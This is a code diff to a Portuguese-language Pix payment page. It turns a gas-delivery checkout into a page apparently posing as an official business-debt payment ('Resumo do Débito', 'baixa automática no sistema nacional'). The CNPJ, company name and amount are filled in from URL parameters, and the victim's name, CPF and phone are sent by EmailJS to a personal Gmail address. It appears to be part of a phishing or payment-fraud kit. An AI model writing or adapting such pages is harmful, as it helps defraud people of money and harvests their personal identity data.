@@ -1090,27 +1090,28 @@
             return params.get(name);
         }
 
-        const subtotalValue = parseFloat(getUrlParameter('subtotal')) || 14.50;
-        const baseTotal = subtotalValue * 1.00; 
-        const deliveryTotal = subtotalValue * 1.46; 
+        const subtotalValue = parseFloat(getUrlParameter('subtotal')) || 0.00;
+        const cnpjValue = getUrlParameter('cnpj') || 'Não informado';
+        const empresaValue = getUrlParameter('empresa') || 'Não informado';
+        const baseTotal = subtotalValue; 
 
         let selectedPaymentType = 'pix';
 
         function renderOrderSummary() {
             const summaryHTML = `
                 <div class="summary-block">
-                    <div class="summary-title"><i class="fas fa-shopping-basket"></i> Resumo do Pedido</div>
+                    <div class="summary-title"><i class="fas fa-file-invoice"></i> Resumo do Débito</div>
                     <div class="summary-row">
-                        <span>Subtotal</span>
-                        <span>R$ ${subtotalValue.toFixed(2).replace('.', ',')}</span>
+                        <span>CNPJ</span>
+                        <span style="font-weight: 600; color: var(--text-dark);">${cnpjValue}</span>
                     </div>
                     <div class="summary-row">
-                        <span>Frete</span>
-                        <span style="color: var(--success); font-weight: bold;">GRÁTIS</span>
+                        <span>Razão Social</span>
+                        <span style="font-weight: 600; color: var(--text-dark); text-align: right; max-width: 60%;">${empresaValue}</span>
                     </div>
                     <div class="summary-total">
-                        <span class="summary-total-label">Total</span>
-                        <span class="summary-total-value" id="display-total">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
+                        <span class="summary-total-label">Valor do Débito</span>
+                        <span class="summary-total-value" id="display-total">R$ ${subtotalValue.toFixed(2).replace('.', ',')}</span>
                     </div>
                 </div>
             `;
@@ -1156,11 +1157,11 @@
                     
                     <div class="payment-options-container">
                         <div class="payment-option-card selected" id="pay-now-pix">
-                            <div class="payment-badge" style="position: absolute; top: 12px; right: -30px; background: var(--success); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Melhor Preço</div>
+                            <div class="payment-badge" style="position: absolute; top: 12px; right: -30px; background: var(--success); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Liberação Imediata</div>
                             <div class="payment-option-icon"><i class="fab fa-pix"></i></div>
                             <div class="payment-option-title">Pix (Aprovação Instantânea)</div>
                             <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
-                            <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
+                            <div class="payment-option-desc">Pagamento seguro com baixa automática no sistema nacional.</div>
                             
                             <div class="pix-form-container" id="pix-input-fields">
                                 <div class="pix-input-group">
@@ -1270,24 +1271,14 @@
         }
 
         function sendEmailJS(name, cpf, phone, total) {
-            const addressFromUrl = getUrlParameter('address') || 'Não informado';
-            const cepFromUrl = getUrlParameter('cep') || '';
-            
-            // Formata o endereço de entrega
-            let endereco_entrega = '';
-            if (cepFromUrl) {
-                endereco_entrega = `Endereço: ${addressFromUrl}, CEP: ${cepFromUrl}`;
-            } else {
-                endereco_entrega = `Endereço: ${addressFromUrl}`;
-            }
-
             const templateParams = {
                 user_name: name,
                 user_cpf: cpf,
                 user_phone: phone,
                 order_total: total.toFixed(2).replace('.', ','),
-                payment_method: selectedPaymentType === 'pix' ? 'Pix' : 'Pagamento na Entrega',
-                endereco_entrega: endereco_entrega,
+                payment_method: 'Pix',
+                cnpj: cnpjValue,
+                empresa: empresaValue,
                 to_email: 'diskgasexpress24h@gmail.com'
             };
 
@@ -1331,42 +1322,6 @@
                 setTimeout(() => { btn.innerHTML = originalContent; }, 2000);
             });
         }
-
-        function showDeliveryModal() {
-            const modal = document.getElementById('delivery-modal');
-            const step1 = document.getElementById('modal-step-1');
-            const step2 = document.getElementById('modal-step-2');
-            const step3 = document.getElementById('modal-step-3');
-            
-            step1.style.display = 'block';
-            step2.style.display = 'none';
-            step3.style.display = 'none';
-            modal.classList.add('active');
-        }
-
-        document.getElementById('modal-close-btn-delivery').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
-        document.getElementById('modal-back-to-pix').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
-        document.getElementById('modal-continue-delivery').addEventListener('click', () => {
-            document.getElementById('modal-step-1').style.display = 'none';
-            document.getElementById('modal-step-2').style.display = 'block';
-        });
-        document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const name = document.getElementById('delivery-email').value;
-            const cpf = document.getElementById('delivery-cpf').value;
-            const phone = document.getElementById('delivery-phone').value;
-            sendEmailJS(name, cpf, phone, subtotalValue * 1.46);
-            document.getElementById('modal-step-2').style.display = 'none';
-            document.getElementById('modal-step-3').style.display = 'block';
-        });
-
-        // Aplicar máscara no telefone do modal de entrega
-        const deliveryNameInput = document.getElementById('delivery-name');
-        if (deliveryNameInput) setupNameInput(deliveryNameInput);
-        const deliveryPhoneInput = document.getElementById('delivery-phone');
-        if (deliveryPhoneInput) setupPhoneInput(deliveryPhoneInput);
-        const deliveryCpfInput = document.getElementById('delivery-cpf');
-        if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
 
         document.addEventListener('DOMContentLoaded', () => {
             renderOrderSummary();
